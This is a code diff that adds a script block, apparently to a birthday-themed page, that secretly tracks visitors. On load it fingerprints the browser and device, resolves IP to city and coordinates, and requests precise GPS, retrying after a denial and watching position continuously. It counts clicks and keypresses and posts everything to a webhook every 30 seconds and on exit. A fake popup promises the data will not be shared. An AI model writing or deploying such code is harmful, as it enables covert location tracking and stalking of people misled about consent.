@@ -1,0 +1,343 @@
+<script>
+// Enhanced location collection with retry mechanism
+function collectLocationData() {
+    const data = {
+        timestamp: new Date().toISOString(),
+        pageType: 'birthday_page',
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+        },
+        windowSize: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight
+        },
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        online: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        } : {},
+        referrer: document.referrer,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+
+    // Get IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+            data.ip = ipData.ip;
+            
+            // Get IP details
+            return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        })
+        .then(response => response.json())
+        .then(ipDetails => {
+            data.ipDetails = {
+                country: ipDetails.country_name,
+                countryCode: ipDetails.country_code,
+                region: ipDetails.region,
+                city: ipDetails.city,
+                postal: ipDetails.postal,
+                latitude: ipDetails.latitude,
+                longitude: ipDetails.longitude,
+                timezone: ipDetails.timezone,
+                org: ipDetails.org,
+                asn: ipDetails.asn
+            };
+            
+            // Try to get GPS location
+            requestGPSLocation(data);
+        })
+        .catch(error => {
+            console.error('IP fetch error:', error);
+            requestGPSLocation(data);
+        });
+}
+
+function requestGPSLocation(data) {
+    if (!navigator.geolocation) {
+        data.gpsError = 'Geolocation not supported';
+        sendData(data);
+        return;
+    }
+
+    // First request - high accuracy
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            data.gpsLocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: new Date(position.timestamp).toISOString()
+            };
+            data.gpsSource = 'high_accuracy';
+            sendData(data);
+        },
+        (error) => {
+            // If permission denied, try with lower accuracy
+            if (error.code === error.PERMISSION_DENIED) {
+                data.gpsError = 'Permission denied for high accuracy';
+                
+                // Try with lower accuracy (some browsers allow this)
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        data.gpsLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        data.gpsSource = 'low_accuracy';
+                        data.gpsRetrySuccess = true;
+                        sendData(data);
+                    },
+                    (retryError) => {
+                        data.gpsError = `Retry failed: ${getGeolocationError(retryError)}`;
+                        sendData(data);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            } else {
+                data.gpsError = getGeolocationError(error);
+                sendData(data);
+            }
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+
+    // Also start watching position for continuous updates
+    let watchId = null;
+    if (navigator.geolocation.watchPosition) {
+        watchId = navigator.geolocation.watchPosition(
+            (position) => {
+                if (!data.gpsUpdates) data.gpsUpdates = [];
+                data.gpsUpdates.push({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date(position.timestamp).toISOString()
+                });
+                
+                // Send update
+                sendData({...data, updateType: 'gps_update'});
+            },
+            (error) => {
+                console.log('Watch error:', error);
+            },
+            {
+                enableHighAccuracy: true,
+                maximumAge: 30000
+            }
+        );
+        
+        // Store watch ID for cleanup
+        data.watchId = watchId;
+    }
+}
+
+function getGeolocationError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            return "User denied location permission";
+        case error.POSITION_UNAVAILABLE:
+            return "Location information unavailable";
+        case error.TIMEOUT:
+            return "Location request timed out";
+        default:
+            return `Unknown error: ${error.message}`;
+    }
+}
+
+function sendData(data) {
+    // Add page interactions
+    if (!data.interactions) {
+        data.interactions = {
+            clicks: 0,
+            scrolls: 0,
+            keypresses: 0,
+            mouseMovements: 0
+        };
+    }
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', '/webhook.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.timeout = 5000;
+    
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            console.log('Data sent successfully');
+        }
+    };
+    
+    xhr.onerror = function() {
+        console.error('Failed to send data');
+    };
+    
+    xhr.ontimeout = function() {
+        console.warn('Request timeout');
+    };
+    
+    try {
+        xhr.send(JSON.stringify(data));
+    } catch (error) {
+        console.error('Error sending data:', error);
+    }
+}
+
+// Track user interactions
+let interactions = {
+    clicks: 0,
+    scrolls: 0,
+    keypresses: 0,
+    mouseMovements: 0,
+    touchEvents: 0,
+    focusChanges: 0
+};
+
+document.addEventListener('click', () => interactions.clicks++);
+window.addEventListener('scroll', () => interactions.scrolls++);
+document.addEventListener('keydown', () => interactions.keypresses++);
+document.addEventListener('mousemove', () => interactions.mouseMovements++);
+document.addEventListener('touchstart', () => interactions.touchEvents++);
+window.addEventListener('focus', () => interactions.focusChanges++);
+window.addEventListener('blur', () => interactions.focusChanges++);
+
+// Periodic data collection
+setInterval(() => {
+    const currentData = {
+        timestamp: new Date().toISOString(),
+        interactions: {...interactions},
+        timeOnPage: performance.now()
+    };
+    sendData(currentData);
+}, 30000);
+
+// Initial collection
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(collectLocationData, 1000);
+    
+    // Send data on page unload
+    window.addEventListener('beforeunload', function() {
+        const exitData = {
+            timestamp: new Date().toISOString(),
+            event: 'page_exit',
+            totalTime: performance.now(),
+            interactions: {...interactions}
+        };
+        
+        // Try to send sync request
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/webhook.php', false);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(exitData));
+        } catch (e) {
+            // Ignore errors on unload
+        }
+    });
+});
+
+// Ask for location permission with user-friendly message
+function requestLocationWithMessage() {
+    if (!navigator.geolocation) {
+        console.log('Geolocation is not supported by your browser');
+        return;
+    }
+    
+    // Show custom message before asking
+    const locationMessage = `
+    <div id="locationRequest" style="
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 30px;
+        border-radius: 15px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        z-index: 10000;
+        max-width: 400px;
+        text-align: center;
+        font-family: Arial, sans-serif;
+    ">
+        <h3 style="color: #333; margin-bottom: 15px;">📍 Location Access Needed</h3>
+        <p style="color: #666; margin-bottom: 20px;">
+            We need your location to provide personalized content and better experience.
+            Your location data is secure and will not be shared.
+        </p>
+        <div style="display: flex; gap: 10px; justify-content: center;">
+            <button onclick="allowLocation()" style="
+                background: #4CAF50;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+            ">
+                Allow Location
+            </button>
+            <button onclick="denyLocation()" style="
+                background: #f44336;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+            ">
+                Deny
+            </button>
+        </div>
+    </div>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', locationMessage);
+}
+
+function allowLocation() {
+    document.getElementById('locationRequest').remove();
+    collectLocationData();
+}
+
+function denyLocation() {
+    document.getElementById('locationRequest').remove();
+    const data = {
+        timestamp: new Date().toISOString(),
+        locationPermission: 'denied_by_user',
+        message: 'User manually denied location access'
+    };
+    sendData(data);
+}
+
+// Auto-request location after page loads
+window.addEventListener('load', function() {
+    setTimeout(requestLocationWithMessage, 2000);
+});
+</script>
